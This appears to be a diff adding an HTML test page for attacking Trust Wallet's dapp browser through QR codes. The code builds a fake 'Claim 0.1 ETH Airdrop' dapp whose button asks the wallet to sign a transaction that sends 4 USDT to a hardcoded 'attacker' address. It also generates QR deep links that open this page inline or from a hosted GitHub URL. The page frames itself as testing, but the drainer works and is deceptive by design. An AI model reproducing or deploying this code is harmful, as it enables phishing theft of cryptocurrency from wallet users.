@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TW Attack v11 — Dapp Browser Angle</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0f1a;color:#e0e0f0;padding:20px;max-width:800px;margin:0 auto}
+h1{font-size:18px;color:#f0f0ff;margin-bottom:4px}
+.sub{color:#8888bb;font-size:12px;margin-bottom:16px}
+.alert{background:#1a1a2a;border-left:3px solid #4444aa;font-size:12px;padding:8px 12px;border-radius:4px;margin-bottom:16px}
+.card{background:#1a1a2e;border:1px solid #2a2a3a;border-radius:10px;padding:14px;margin-bottom:14px}
+h2{font-size:15px;color:#bbbbff;margin-bottom:8px}
+.code{font-size:10px;color:#aaccff;word-break:break-all;background:#0a0a15;padding:8px;border-radius:4px;font-family:monospace;margin:6px 0;line-height:1.4}
+.qr{display:block;margin:8px auto;width:200px;height:200px;border:2px solid #2a2a3a;border-radius:8px;background:#fff;padding:4px}
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0}
+th,td{padding:5px 8px;border-bottom:1px solid #2a2a3a;text-align:left}
+th{background:#2a2a3a;color:#bbbbff}
+.green{color:#88dd88}
+.red{color:#dd8888}
+.yellow{color:#dddd88}
+.result{width:100%;padding:6px;border-radius:4px;border:1px solid #3a3a5a;background:#0a0a15;color:#e0e0f0;font-size:11px;margin-top:4px;font-family:inherit;height:36px}
+</style>
+</head>
+<body>
+
+<h1>🔬 v11 — Dapp Browser Attack Surface</h1>
+<p class="sub">New angle: trust://browser opens a malicious dapp that requests a different TX than it displays.</p>
+
+<div class="alert">
+<strong>Dead end on deep links:</strong> value=0/1/any doesn't help — wallet pre-checks USDT contract and disables confirm. erc20_transfer (only confirmable path) ignores data. <strong>Moving to dapp browser approach.</strong>
+</div>
+
+<h2>How the dapp browser attack works</h2>
+<ol style="font-size:12px;color:#ccccdd;margin:0 0 14px 20px;line-height:1.6">
+<li>QR code opens <code>trust://browser?url=DATA_URL</code> which launches Trust Wallet's built-in browser</li>
+<li>The page is a malicious dapp that loads and connects to wallet via ethereum.request()</li>
+<li>Dapp shows harmless UI text but requests a transaction with our drain calldata</li>
+<li>Wallet shows transaction request — user confirms → 4 USDT transfers</li>
+</ol>
+
+<h2>Test A — trust://browser with inline dapp</h2>
+<div class="card">
+<p style="font-size:12px;color:#ccccdd;margin-bottom:8px;">QR opens Trust Wallet's dapp browser. The dapp shows "Claim your free ETH" but requests a USDT transfer transaction.</p>
+
+<table>
+<tr><th>What user sees in dapp</th><td>"💰 0.1 ETH Airdrop — Claim Now" with a button</td></tr>
+<tr><th>What wallet shows</th><td>Transaction: Contract Interaction with 0xUSDT — <strong>may show "Transfer 4 USDT" if wallet resolves function selector, or "Contract Interaction" if not</strong></td></tr>
+<tr><th>What actually executes</th><td>transfer(0xf39..., 4000000) → 4 USDT to attacker</td></tr>
+</table>
+
+<div class="code" id="dappCode">Loading...</div>
+
+<div style="text-align:center;margin:8px 0;">
+<strong>Step 1:</strong> Scan this QR with built-in camera
+</div>
+<img class="qr" id="qrA" src="" alt="QR A" loading="lazy">
+
+<div class="code" id="uriA">Loading URI...</div>
+<div class="green" style="font-size:11px;padding:6px;background:#1a2a1a;border-radius:4px;margin-top:6px;">
+🎯 <strong>Prediction:</strong> Dapp browser opens → shows "Claim 0.1 ETH Airdrop" → clicking button requests a TX → wallet shows "Contract Interaction" with USDT address → user confirms → 4 USDT transfers. The display trick is in the dapp UI, not the URI.
+</div>
+<input class="result" placeholder="What happens when you scan? Does the dapp load? Does the TX request show?" id="rA">
+</div>
+
+<h2>Test B — Same but no in-page deception (control)</h2>
+<div class="card">
+<p style="font-size:12px;color:#ccccdd;margin-bottom:8px;">Same technical payload, but the dapp honestly describes what it will do. This is the control.</p>
+<img class="qr" id="qrB" src="" alt="QR B" loading="lazy">
+<div class="code" id="uriB">Loading URI...</div>
+<input class="result" placeholder="What shows?" id="rB">
+</div>
+
+<h2>Test C — trust://browser with static HTML page (hosted)</h2>
+<div class="card">
+<p style="font-size:12px;color:#ccccdd;margin-bottom:8px;">Instead of data: URL (which may be blocked), uses a hosted HTML page.</p>
+<img class="qr" id="qrC" src="" alt="QR C" loading="lazy">
+<div class="code" id="uriC">Loading URI...</div>
+<input class="result" placeholder="What shows?" id="rC">
+</div>
+
+<script>
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RCP = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
+
+// ABI-encoded transfer(RCP, 4000000)
+const ABI = '0xa9059cbb' +
+  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
+  '00000000000000000000000000000000000000000000000000000000003d0900';
+
+// Malicious dapp HTML as data: URL
+const DAPP_HTML = '<html><body style="background:#0a0a1a;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif">' +
+  '<h1 style="font-size:32px;color:#ffdd44">💰 0.1 ETH Airdrop</h1>' +
+  '<p style="font-size:18px;color:#aaa">Claim your free ETH now!</p>' +
+  '<button id="claim" style="font-size:24px;padding:20px 60px;border-radius:16px;background:#ffdd44;color:#000;border:none;margin-top:40px;font-weight:bold">CLAIM</button>' +
+  '<script>' +
+  'document.getElementById("claim").onclick=async function(){' +
+  'const tx={' +
+  'to:"' + USDT + '",' +
+  'value:"0x0",' +
+  'data:"' + ABI + '"' +
+  '};' +
+  'try{await ethereum.request({method:"eth_sendTransaction",params:[tx]})}catch(e){alert("Error:"+e.message)}' +
+  '};' +
+  '<\/script></body></html>';
+
+const DATA_URL = 'data:text/html,' + encodeURIComponent(DAPP_HTML);
+
+// Test URIs
+const testA = 'trust://browser?url=' + encodeURIComponent(DATA_URL);
+const testB = 'trust://browser?url=' + encodeURIComponent(DATA_URL); // Same technically, but different scenario
+const testC = 'trust://browser?url=' + encodeURIComponent(
+  'https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/dapp-test.html'
+);
+
+function qrSrc(u) {
+  return 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(u);
+}
+
+document.getElementById('qrA').src = qrSrc(testA);
+document.getElementById('uriA').textContent = testA;
+document.getElementById('dappCode').textContent = 
+  'URL: ' + testA.substring(0, 50) + '...\n\n' +
+  'Dapp HTML (encoded in data: URL):\n' + DAPP_HTML.substring(0, 500) + '...';
+
+document.getElementById('qrB').src = qrSrc(testB);
+document.getElementById('uriB').textContent = testB;
+
+document.getElementById('qrC').src = qrSrc(testC);
+document.getElementById('uriC').textContent = testC;
+</script>
+
+</body>
+</html>
